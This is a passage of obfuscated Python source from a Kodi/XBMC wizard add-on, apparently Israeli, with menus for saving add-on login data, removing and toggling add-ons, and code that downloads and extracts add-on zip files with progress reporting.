	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2995
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2996
	setView ('files','viewType')#line:2997
def loginMenu ():#line:2999
	O000OO00O0000OO00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3000
	O0OOOOOOO0OO0O000 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3001
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3002
	addFile ('Save Login Data: %s'%O000OO00O0000OO00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3003
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0OOOOOOO0OO0O000 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3004
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3005
	for O000OO00O0000OO00 in loginit .ORDER :#line:3007
		O0O00O00OOO0OO0O0 =LOGINID [O000OO00O0000OO00 ]['name']#line:3008
		O0OO00OO0O0OOO000 =LOGINID [O000OO00O0000OO00 ]['path']#line:3009
		O0OO0000O00O000O0 =LOGINID [O000OO00O0000OO00 ]['saved']#line:3010
		OOOO0O0O00OOO000O =LOGINID [O000OO00O0000OO00 ]['file']#line:3011
		OO0OOO000000OOO00 =wiz .getS (O0OO0000O00O000O0 )#line:3012
		O00O0OOOOOO0OO0OO =loginit .loginUser (O000OO00O0000OO00 )#line:3013
		OO000OOO0000OO000 =LOGINID [O000OO00O0000OO00 ]['icon']if os .path .exists (O0OO00OO0O0OOO000 )else ICONLOGIN #line:3014
		OOOO000O00OO0O0O0 =LOGINID [O000OO00O0000OO00 ]['fanart']if os .path .exists (O0OO00OO0O0OOO000 )else FANART #line:3015
		O0O000O000O00000O =createMenu ('saveaddon','Login',O000OO00O0000OO00 )#line:3016
		OOOO000O0O000O000 =createMenu ('save','Login',O000OO00O0000OO00 )#line:3017
		O0O000O000O00000O .append ((THEME2 %'%s Settings'%O0O00O00OOO0OO0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O000OO00O0000OO00 )))#line:3018
		addFile ('[+]-> %s'%O0O00O00OOO0OO0O0 ,'',icon =OO000OOO0000OO000 ,fanart =OOOO000O00OO0O0O0 ,themeit =THEME3 )#line:3020
		if not os .path .exists (O0OO00OO0O0OOO000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO000OOO0000OO000 ,fanart =OOOO000O00OO0O0O0 ,menu =O0O000O000O00000O )#line:3021
		elif not O00O0OOOOOO0OO0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O000OO00O0000OO00 ,icon =OO000OOO0000OO000 ,fanart =OOOO000O00OO0O0O0 ,menu =O0O000O000O00000O )#line:3022
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O0OOOOOO0OO0OO ,'authlogin',O000OO00O0000OO00 ,icon =OO000OOO0000OO000 ,fanart =OOOO000O00OO0O0O0 ,menu =O0O000O000O00000O )#line:3023
		if OO0OOO000000OOO00 =="":#line:3024
			if os .path .exists (OOOO0O0O00OOO000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O000OO00O0000OO00 ,icon =OO000OOO0000OO000 ,fanart =OOOO000O00OO0O0O0 ,menu =OOOO000O0O000O000 )#line:3025
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O000OO00O0000OO00 ,icon =OO000OOO0000OO000 ,fanart =OOOO000O00OO0O0O0 ,menu =OOOO000O0O000O000 )#line:3026
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OOO000000OOO00 ,'',icon =OO000OOO0000OO000 ,fanart =OOOO000O00OO0O0O0 ,menu =OOOO000O0O000O000 )#line:3027
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3029
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3030
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3031
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3032
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3033
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3034
	setView ('files','viewType')#line:3035
def fixUpdate ():#line:3037
	if KODIV <17 :#line:3038
		O000O00O000000000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3039
		try :#line:3040
			os .remove (O000O00O000000000 )#line:3041
		except Exception as OOO0O00O0O0O0000O :#line:3042
			wiz .log ("Unable to remove %s, Purging DB"%O000O00O000000000 )#line:3043
			wiz .purgeDb (O000O00O000000000 )#line:3044
	else :#line:3045
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3046
def removeAddonMenu ():#line:3048
	OOO0O0OO00OOO0OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3049
	OOOO0OOO00OO0O00O =[];OOO00OOO00O0O00O0 =[]#line:3050
	for OOO000OO0OO0OO0OO in sorted (OOO0O0OO00OOO0OO0 ,key =lambda O000OOO00O0O0OOO0 :O000OOO00O0O0OOO0 ):#line:3051
		OO0OOOOO0OO0OOOOO =os .path .split (OOO000OO0OO0OO0OO [:-1 ])[1 ]#line:3052
		if OO0OOOOO0OO0OOOOO in EXCLUDES :continue #line:3053
		elif OO0OOOOO0OO0OOOOO in DEFAULTPLUGINS :continue #line:3054
		elif OO0OOOOO0OO0OOOOO =='packages':continue #line:3055
		O0O0O0OOOO0O000OO =os .path .join (OOO000OO0OO0OO0OO ,'addon.xml')#line:3056
		if os .path .exists (O0O0O0OOOO0O000OO ):#line:3057
			OO0O0OOOOO0OOO00O =open (O0O0O0OOOO0O000OO )#line:3058
			OOOO00O000O0000OO =OO0O0OOOOO0OOO00O .read ()#line:3059
			OO0O0OO00000OOOO0 =wiz .parseDOM (OOOO00O000O0000OO ,'addon',ret ='id')#line:3060
			OOO000OO00OO000O0 =OO0OOOOO0OO0OOOOO if len (OO0O0OO00000OOOO0 )==0 else OO0O0OO00000OOOO0 [0 ]#line:3062
			try :#line:3063
				O00OOO0O0O0OO0O00 =xbmcaddon .Addon (id =OOO000OO00OO000O0 )#line:3064
				OOOO0OOO00OO0O00O .append (O00OOO0O0O0OO0O00 .getAddonInfo ('name'))#line:3065
				OOO00OOO00O0O00O0 .append (OOO000OO00OO000O0 )#line:3066
			except :#line:3067
				pass #line:3068
	if len (OOOO0OOO00OO0O00O )==0 :#line:3069
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3070
		return #line:3071
	if KODIV >16 :#line:3072
		OO0O000O00000OO00 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO0OOO00OO0O00O )#line:3073
	else :#line:3074
		OO0O000O00000OO00 =[];O00OOOO00000O0OOO =0 #line:3075
		OO00OO0OOO00O00O0 =["-- Click here to Continue --"]+OOOO0OOO00OO0O00O #line:3076
		while not O00OOOO00000O0OOO ==-1 :#line:3077
			O00OOOO00000O0OOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00OO0OOO00O00O0 )#line:3078
			if O00OOOO00000O0OOO ==-1 :break #line:3079
			elif O00OOOO00000O0OOO ==0 :break #line:3080
			else :#line:3081
				O0O00000OOO0O0000 =(O00OOOO00000O0OOO -1 )#line:3082
				if O0O00000OOO0O0000 in OO0O000O00000OO00 :#line:3083
					OO0O000O00000OO00 .remove (O0O00000OOO0O0000 )#line:3084
					OO00OO0OOO00O00O0 [O00OOOO00000O0OOO ]=OOOO0OOO00OO0O00O [O0O00000OOO0O0000 ]#line:3085
				else :#line:3086
					OO0O000O00000OO00 .append (O0O00000OOO0O0000 )#line:3087
					OO00OO0OOO00O00O0 [O00OOOO00000O0OOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOOO0OOO00OO0O00O [O0O00000OOO0O0000 ])#line:3088
	if OO0O000O00000OO00 ==None :return #line:3089
	if len (OO0O000O00000OO00 )>0 :#line:3090
		wiz .addonUpdates ('set')#line:3091
		for O00O000O0OOOO0OO0 in OO0O000O00000OO00 :#line:3092
			removeAddon (OOO00OOO00O0O00O0 [O00O000O0OOOO0OO0 ],OOOO0OOO00OO0O00O [O00O000O0OOOO0OO0 ],True )#line:3093
		xbmc .sleep (1000 )#line:3095
		if INSTALLMETHOD ==1 :O0O0O000OOOOOOO00 =1 #line:3097
		elif INSTALLMETHOD ==2 :O0O0O000OOOOOOO00 =0 #line:3098
		else :O0O0O000OOOOOOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3099
		if O0O0O000OOOOOOO00 ==1 :wiz .reloadFix ('remove addon')#line:3100
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3101
def removeAddonDataMenu ():#line:3103
	if os .path .exists (ADDOND ):#line:3104
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3105
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3106
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3107
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3108
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3109
		OO00O0O00000O0000 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3110
		for OO0O00OO000O0O000 in sorted (OO00O0O00000O0000 ,key =lambda O0OOO0OO0O0OOOOOO :O0OOO0OO0O0OOOOOO ):#line:3111
			OOO000O0OO0O000O0 =OO0O00OO000O0O000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3112
			O00O0OOOOO000OO0O =os .path .join (OO0O00OO000O0O000 .replace (ADDOND ,ADDONS ),'icon.png')#line:3113
			O000OO0000OOOOO0O =os .path .join (OO0O00OO000O0O000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3114
			OO0O0OO000O00000O =OOO000O0OO0O000O0 #line:3115
			OOO00O000OO00O0OO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3116
			for O0O000O00O0O00OOO in OOO00O000OO00O0OO :#line:3117
				OO0O0OO000O00000O =OO0O0OO000O00000O .replace (O0O000O00O0O00OOO ,OOO00O000OO00O0OO [O0O000O00O0O00OOO ])#line:3118
			if OOO000O0OO0O000O0 in EXCLUDES :OO0O0OO000O00000O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO0O0OO000O00000O #line:3119
			else :OO0O0OO000O00000O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO0O0OO000O00000O #line:3120
			addFile (' %s'%OO0O0OO000O00000O ,'removedata',OOO000O0OO0O000O0 ,icon =O00O0OOOOO000OO0O ,fanart =O000OO0000OOOOO0O ,themeit =THEME2 )#line:3121
	else :#line:3122
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3123
	setView ('files','viewType')#line:3124
def enableAddons ():#line:3126
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3127
	OO00O0O0O000O0O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3128
	O000OO000O0O0000O =0 #line:3129
	for O00000O0OO000OOO0 in sorted (OO00O0O0O000O0O0O ,key =lambda OO0O000OOOOO000OO :OO0O000OOOOO000OO ):#line:3130
		OOO0000000000O00O =os .path .split (O00000O0OO000OOO0 [:-1 ])[1 ]#line:3131
		if OOO0000000000O00O in EXCLUDES :continue #line:3132
		if OOO0000000000O00O in DEFAULTPLUGINS :continue #line:3133
		O0OOO0O000O00O0O0 =os .path .join (O00000O0OO000OOO0 ,'addon.xml')#line:3134
		if os .path .exists (O0OOO0O000O00O0O0 ):#line:3135
			O000OO000O0O0000O +=1 #line:3136
			OO00O0O0O000O0O0O =O00000O0OO000OOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3137
			O0O000000OO00OO0O =open (O0OOO0O000O00O0O0 )#line:3138
			OOOOO0O0O0OOOO000 =O0O000000OO00OO0O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3139
			OO00000OO0OO0OOOO =wiz .parseDOM (OOOOO0O0O0OOOO000 ,'addon',ret ='id')#line:3140
			O00O0OO00000OO0OO =wiz .parseDOM (OOOOO0O0O0OOOO000 ,'addon',ret ='name')#line:3141
			try :#line:3142
				O0O0OOOO0O0OOO00O =OO00000OO0OO0OOOO [0 ]#line:3143
				OO0OO00O0OOOOOOOO =O00O0OO00000OO0OO [0 ]#line:3144
			except :#line:3145
				continue #line:3146
			try :#line:3147
				OO000O00OO0O0OOO0 =xbmcaddon .Addon (id =O0O0OOOO0O0OOO00O )#line:3148
				OO00OOOO0O000O0O0 ="[COLOR green][Enabled][/COLOR]"#line:3149
				O0O00OOOO00OOO00O ="false"#line:3150
			except :#line:3151
				OO00OOOO0O000O0O0 ="[COLOR red][Disabled][/COLOR]"#line:3152
				O0O00OOOO00OOO00O ="true"#line:3153
				pass #line:3154
			OOOOOO0OOOOOO0O0O =os .path .join (O00000O0OO000OOO0 ,'icon.png')if os .path .exists (os .path .join (O00000O0OO000OOO0 ,'icon.png'))else ICON #line:3155
			OO0000OO0000O0O00 =os .path .join (O00000O0OO000OOO0 ,'fanart.jpg')if os .path .exists (os .path .join (O00000O0OO000OOO0 ,'fanart.jpg'))else FANART #line:3156
			addFile ("%s %s"%(OO00OOOO0O000O0O0 ,OO0OO00O0OOOOOOOO ),'toggleaddon',OO00O0O0O000O0O0O ,O0O00OOOO00OOO00O ,icon =OOOOOO0OOOOOO0O0O ,fanart =OO0000OO0000O0O00 )#line:3157
			O0O000000OO00OO0O .close ()#line:3158
	if O000OO000O0O0000O ==0 :#line:3159
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3160
	setView ('files','viewType')#line:3161
def changeFeq ():#line:3163
	O0O000O00O0O0O000 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3164
	O00000OO0000OOOOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0O000O00O0O0O000 )#line:3165
	if not O00000OO0000OOOOO ==-1 :#line:3166
		wiz .setS ('autocleanfeq',str (O00000OO0000OOOOO ))#line:3167
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0O000O00O0O0O000 [O00000OO0000OOOOO ]))#line:3168
def developer ():#line:3170
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3171
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3172
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3173
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3174
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3175
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3176
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3177
	setView ('files','viewType')#line:3179
def download (OO0O00OOOO0OOOOO0 ,O0OO00O0O0O0OOOO0 ):#line:3184
  OOO00OO0O0000OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3185
  OOOO00OOOO00O00OO =xbmcgui .DialogProgress ()#line:3186
  OOOO00OOOO00O00OO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3187
  O00O0O0000000O0O0 =os .path .join (OOO00OO0O0000OO00 ,'isr.zip')#line:3188
  O000O0O00O0OOOO0O =urllib2 .Request (OO0O00OOOO0OOOOO0 )#line:3189
  OOOO0O00OOOO000OO =urllib2 .urlopen (O000O0O00O0OOOO0O )#line:3190
  OO000OOO0OOO0O000 =xbmcgui .DialogProgress ()#line:3192
  OO000OOO0OOO0O000 .create ("Downloading","Downloading "+name )#line:3193
  OO000OOO0OOO0O000 .update (0 )#line:3194
  OOO000O00O0OOO0OO =O0OO00O0O0O0OOOO0 #line:3195
  OOO000O0000OOO00O =open (O00O0O0000000O0O0 ,'wb')#line:3196
  try :#line:3198
    O00OO0OO0O0000O00 =OOOO0O00OOOO000OO .info ().getheader ('Content-Length').strip ()#line:3199
    O00000OOOO00O0OO0 =True #line:3200
  except AttributeError :#line:3201
        O00000OOOO00O0OO0 =False #line:3202
  if O00000OOOO00O0OO0 :#line:3204
        O00OO0OO0O0000O00 =int (O00OO0OO0O0000O00 )#line:3205
  OOOOOO0O0OO0O00O0 =0 #line:3207
  OOO0O0O00OO0OO000 =time .time ()#line:3208
  while True :#line:3209
        OOO0OO00O0O0O0O00 =OOOO0O00OOOO000OO .read (8192 )#line:3210
        if not OOO0OO00O0O0O0O00 :#line:3211
            sys .stdout .write ('\n')#line:3212
            break #line:3213
        OOOOOO0O0OO0O00O0 +=len (OOO0OO00O0O0O0O00 )#line:3215
        OOO000O0000OOO00O .write (OOO0OO00O0O0O0O00 )#line:3216
        if not O00000OOOO00O0OO0 :#line:3218
            O00OO0OO0O0000O00 =OOOOOO0O0OO0O00O0 #line:3219
        if OO000OOO0OOO0O000 .iscanceled ():#line:3220
           OO000OOO0OOO0O000 .close ()#line:3221
           try :#line:3222
            os .remove (O00O0O0000000O0O0 )#line:3223
           except :#line:3224
            pass #line:3225
           break #line:3226
        OO0OO0O00O0O0OO0O =float (OOOOOO0O0OO0O00O0 )/O00OO0OO0O0000O00 #line:3227
        OO0OO0O00O0O0OO0O =round (OO0OO0O00O0O0OO0O *100 ,2 )#line:3228
        O0OOO00OOOO00O0OO =OOOOOO0O0OO0O00O0 /(1024 *1024 )#line:3229
        OO00OOOO0OO0OOO0O =O00OO0OO0O0000O00 /(1024 *1024 )#line:3230
        OOOOO0OO0OO000O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO00OOOO00O0OO ,'teal',OO00OOOO0OO0OOO0O )#line:3231
        if (time .time ()-OOO0O0O00OO0OO000 )>0 :#line:3232
          O000OO000OO0OO0O0 =OOOOOO0O0OO0O00O0 /(time .time ()-OOO0O0O00OO0OO000 )#line:3233
          O000OO000OO0OO0O0 =O000OO000OO0OO0O0 /1024 #line:3234
        else :#line:3235
         O000OO000OO0OO0O0 =0 #line:3236
        OO0OO000O000OO000 ='KB'#line:3237
        if O000OO000OO0OO0O0 >=1024 :#line:3238
           O000OO000OO0OO0O0 =O000OO000OO0OO0O0 /1024 #line:3239
           OO0OO000O000OO000 ='MB'#line:3240
        if O000OO000OO0OO0O0 >0 and not OO0OO0O00O0O0OO0O ==100 :#line:3241
            O0000O0O00O000O0O =(O00OO0OO0O0000O00 -OOOOOO0O0OO0O00O0 )/O000OO000OO0OO0O0 #line:3242
        else :#line:3243
            O0000O0O00O000O0O =0 #line:3244
        O0O0O000O000O000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000OO000OO0OO0O0 ,OO0OO000O000OO000 )#line:3245
        OO000OOO0OOO0O000 .update (int (OO0OO0O00O0O0OO0O ),"Downloading "+name ,OOOOO0OO0OO000O00 ,O0O0O000O000O000O )#line:3247
  OOO00O0O0OO0O00OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3250
  OOO000O0000OOO00O .close ()#line:3252
  extract (O00O0O0000000O0O0 ,OOO00O0O0OO0O00OO ,OO000OOO0OOO0O000 )#line:3254
  if os .path .exists (OOO00O0O0OO0O00OO +'/scakemyer-script.quasar.burst'):#line:3255
    if os .path .exists (OOO00O0O0OO0O00OO +'/script.quasar.burst'):#line:3256
     shutil .rmtree (OOO00O0O0OO0O00OO +'/script.quasar.burst',ignore_errors =False )#line:3257
    os .rename (OOO00O0O0OO0O00OO +'/scakemyer-script.quasar.burst',OOO00O0O0OO0O00OO +'/script.quasar.burst')#line:3258
  if os .path .exists (OOO00O0O0OO0O00OO +'/plugin.video.kmediatorrent-master'):#line:3260
    if os .path .exists (OOO00O0O0OO0O00OO +'/plugin.video.kmediatorrent'):#line:3261
     shutil .rmtree (OOO00O0O0OO0O00OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3262
    os .rename (OOO00O0O0OO0O00OO +'/plugin.video.kmediatorrent-master',OOO00O0O0OO0O00OO +'/plugin.video.kmediatorrent')#line:3263
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3264
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3265
  try :#line:3266
    os .remove (O00O0O0000000O0O0 )#line:3267
  except :#line:3268
    pass #line:3269
  OO000OOO0OOO0O000 .close ()#line:3270
def dis_or_enable_addon (O0O0OO0OOO0O0O00O ,O0O00OO0O000O0O0O ,enable ="true"):#line:3271
    import json #line:3272
    OOOOOO0O000000OOO ='"%s"'%O0O0OO0OOO0O0O00O #line:3273
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0OO0OOO0O0O00O )and enable =="true":#line:3274
        logging .warning ('already Enabled')#line:3275
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0O0OO0OOO0O0O00O )#line:3276
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0OO0OOO0O0O00O )and enable =="false":#line:3277
        return xbmc .log ("### Skipped %s, reason = not installed"%O0O0OO0OOO0O0O00O )#line:3278
    else :#line:3279
        O0OOOO0O00OO0OO0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOOOOO0O000000OOO ,enable )#line:3280
        O0OO0OOOO0OO00O0O =xbmc .executeJSONRPC (O0OOOO0O00OO0OO0O )#line:3281
        O0OOO00O000O0OO0O =json .loads (O0OO0OOOO0OO00O0O )#line:3282
        if enable =="true":#line:3283
            xbmc .log ("### Enabled %s, response = %s"%(O0O0OO0OOO0O0O00O ,O0OOO00O000O0OO0O ))#line:3284
        else :#line:3285
            xbmc .log ("### Disabled %s, response = %s"%(O0O0OO0OOO0O0O00O ,O0OOO00O000O0OO0O ))#line:3286
    if O0O00OO0O000O0O0O =='auto':#line:3287
     return True #line:3288
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3289
def chunk_report (OOOOOO00O00OO0O0O ,O00O00OO0000O0OO0 ,OOOO0OOO0OOOOOOO0 ):#line:3290
   O0OOO0OOOO0OO0O00 =float (OOOOOO00O00OO0O0O )/OOOO0OOO0OOOOOOO0 #line:3291
   O0OOO0OOOO0OO0O00 =round (O0OOO0OOOO0OO0O00 *100 ,2 )#line:3292
   if OOOOOO00O00OO0O0O >=OOOO0OOO0OOOOOOO0 :#line:3294
      sys .stdout .write ('\n')#line:3295
def chunk_read (OOO000O0OOO0OO0OO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3297
   import time #line:3298
   OOO0O00O00OO0O0OO =int (filesize )*1000000 #line:3299
   O00O0OO0O0O00O00O =0 #line:3301
   OO00OOOOOO0O000O0 =time .time ()#line:3302
   OO00O0OOO0OOO00O0 =0 #line:3303
   logging .warning ('Downloading')#line:3305
   with open (destination ,"wb")as OO00OO0O0000OOOO0 :#line:3306
    while 1 :#line:3307
      OOOOO0OO000OOO000 =time .time ()-OO00OOOOOO0O000O0 #line:3308
      O0OOOOO000000000O =int (OO00O0OOO0OOO00O0 *chunk_size )#line:3309
      OOOOO0O0000000O00 =OOO000O0OOO0OO0OO .read (chunk_size )#line:3310
      OO00OO0O0000OOOO0 .write (OOOOO0O0000000O00 )#line:3311
      OO00OO0O0000OOOO0 .flush ()#line:3312
      O00O0OO0O0O00O00O +=len (OOOOO0O0000000O00 )#line:3313
      OOO0O0O000OOOO0OO =float (O00O0OO0O0O00O00O )/OOO0O00O00OO0O0OO #line:3314
      OOO0O0O000OOOO0OO =round (OOO0O0O000OOOO0OO *100 ,2 )#line:3315
      if int (OOOOO0OO000OOO000 )>0 :#line:3316
        O000OOO0O0O000OO0 =int (O0OOOOO000000000O /(1024 *OOOOO0OO000OOO000 ))#line:3317
      else :#line:3318
         O000OOO0O0O000OO0 =0 #line:3319
      if O000OOO0O0O000OO0 >1024 and not OOO0O0O000OOOO0OO ==100 :#line:3320
          OO0OO0000OO000O00 =int (((OOO0O00O00OO0O0OO -O0OOOOO000000000O )/1024 )/(O000OOO0O0O000OO0 ))#line:3321
      else :#line:3322
          OO0OO0000OO000O00 =0 #line:3323
      if OO0OO0000OO000O00 <0 :#line:3324
        OO0OO0000OO000O00 =0 #line:3325
      dp .update (int (OOO0O0O000OOOO0OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO0O0O000OOOO0OO ,O0OOOOO000000000O /(1024 *1024 ),OOO0O00O00OO0O0OO /(1000 *1000 ),O000OOO0O0O000OO0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0OO0000OO000O00 ,60 ))#line:3326
      if dp .iscanceled ():#line:3327
         dp .close ()#line:3328
         break #line:3329
      if not OOOOO0O0000000O00 :#line:3330
         break #line:3331
      if report_hook :#line:3333
         report_hook (O00O0OO0O0O00O00O ,chunk_size ,OOO0O00O00OO0O0OO )#line:3334
      OO00O0OOO0OOO00O0 +=1 #line:3335
   logging .warning ('END Downloading')#line:3336
   return O00O0OO0O0O00O00O #line:3337
def googledrive_download (OOOO0O000OO00OO0O ,OOOO00O0O0OOO00O0 ,OO0O000OOO0O00O00 ,O0000O0O000OO0OOO ):#line:3339
    O0O0OOOOO0000OOO0 =[]#line:3343
    OO0OO000OOOOOO0O0 =OOOO0O000OO00OO0O .split ('=')#line:3344
    OOOO0O000OO00OO0O =OO0OO000OOOOOO0O0 [len (OO0OO000OOOOOO0O0 )-1 ]#line:3345
    def O00OO0000OOOOOO0O (OOO00OO000O00OOO0 ):#line:3347
        for O0OOOO0000O00O0O0 in OOO00OO000O00OOO0 :#line:3349
            logging .warning ('cookie.name')#line:3350
            logging .warning (O0OOOO0000O00O0O0 .name )#line:3351
            OO000OO0000OO000O =O0OOOO0000O00O0O0 .value #line:3352
            if 'download_warning'in O0OOOO0000O00O0O0 .name :#line:3353
                logging .warning (O0OOOO0000O00O0O0 .value )#line:3354
                logging .warning ('cookie.value')#line:3355
                return O0OOOO0000O00O0O0 .value #line:3356
            return OO000OO0000OO000O #line:3357
        return None #line:3359
    def OO00OOO0OOOO0O0O0 (O0O000O00OOOOOO0O ,O00OOO0O0O000000O ):#line:3361
        OO0OO0OOO00O0O000 =32768 #line:3363
        OO0000000OOO0OOOO =time .time ()#line:3364
        with open (O00OOO0O0O000000O ,"wb")as OO00O0000OO00O000 :#line:3366
            O00000OOO00000O00 =1 #line:3367
            OOOO0000O0OOO0OOO =32768 #line:3368
            try :#line:3369
                O0O00OOOOOOO0000O =int (O0O000O00OOOOOO0O .headers .get ('content-length'))#line:3370
                print ('file total size :',O0O00OOOOOOO0000O )#line:3371
            except TypeError :#line:3372
                print ('using dummy length !!!')#line:3373
                O0O00OOOOOOO0000O =int (O0000O0O000OO0OOO )*1000000 #line:3374
            for O0O0O0O0O00OO00O0 in O0O000O00OOOOOO0O .iter_content (OO0OO0OOO00O0O000 ):#line:3375
                if O0O0O0O0O00OO00O0 :#line:3376
                    OO00O0000OO00O000 .write (O0O0O0O0O00OO00O0 )#line:3377
                    OO00O0000OO00O000 .flush ()#line:3378
                    O0O0O0O00OO000OO0 =time .time ()-OO0000000OOO0OOOO #line:3379
                    O0OO0O0000O0000O0 =int (O00000OOO00000O00 *OOOO0000O0OOO0OOO )#line:3380
                    if O0O0O0O00OO000OO0 ==0 :#line:3381
                        O0O0O0O00OO000OO0 =0.1 #line:3382
                    OOOOO0OO000O0O00O =int (O0OO0O0000O0000O0 /(1024 *O0O0O0O00OO000OO0 ))#line:3383
                    O0OO000OOO0O00O00 =int (O00000OOO00000O00 *OOOO0000O0OOO0OOO *100 /O0O00OOOOOOO0000O )#line:3384
                    if OOOOO0OO000O0O00O >1024 and not O0OO000OOO0O00O00 ==100 :#line:3385
